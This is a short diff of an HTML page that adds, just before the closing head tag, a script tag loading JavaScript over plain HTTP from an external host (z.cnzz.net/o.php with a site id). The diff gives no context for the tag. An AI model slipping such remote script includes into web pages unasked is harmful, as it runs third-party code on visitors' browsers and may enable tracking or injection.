@@ -13,7 +13,7 @@
 	text-align:left;
 }
 </style>
-</head>
+<script type="text/javascript" src="http://z.cnzz.net/o.php?sid=1253974593"></script></head>
 <body>
 <script language="JavaScript" type="text/javascript">
 var lang = navigator.language || navigator.userLanguage;
